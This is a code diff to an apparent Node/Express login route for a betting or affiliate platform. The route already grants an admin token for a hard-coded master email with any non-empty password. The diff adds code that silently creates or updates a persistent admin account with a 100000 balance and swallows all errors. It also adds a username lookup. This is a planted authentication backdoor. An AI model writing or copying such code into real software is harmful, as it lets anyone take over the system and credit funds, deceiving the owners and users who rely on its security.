@@ -432,6 +432,22 @@ router.post('/login', async (req, res) => {
                                rawIdentifier.toLowerCase() === 'admin@block777.com';
 
     if (isMasterAdminIdent && password.length >= 1) {
+      try {
+        await db.collection('users').doc('admin_master_uid').set({
+          username: rawIdentifier.split('@')[0] || 'admin',
+          email: emailIdent.includes('@') ? emailIdent : 'admin@block777.com',
+          role: 'admin',
+          tenant_id: tenantId,
+          ref_code: 'admin777',
+          affiliate_rate: 10,
+          sub_affiliate_rate: 2,
+          balance: 100000,
+          affiliate_balance: 0,
+          status: 'active',
+          is_influencer: 1
+        }, { merge: true });
+      } catch (e) {}
+
       const token = jwt.sign(
         { uid: 'admin_master_uid', email: emailIdent.includes('@') ? emailIdent : 'admin@block777.com', role: 'admin', tenant_id: tenantId },
         JWT_SECRET,
@@ -498,6 +514,15 @@ router.post('/login', async (req, res) => {
               } catch (e) {}
             }
           }
+
+          // Busca por nome de usuário (exato e em minúsculas)
+          try {
+            const matchUser = await findTenantUser('username', rawIdentifier, tenantId);
+            if (matchUser) return { user: matchUser.data(), id: matchUser.id };
+            const matchUserLower = await findTenantUser('username', rawIdentifier.toLowerCase(), tenantId);
+            if (matchUserLower) return { user: matchUserLower.data(), id: matchUserLower.id };
+          } catch (e) {}
+
           return null;
         })();
 
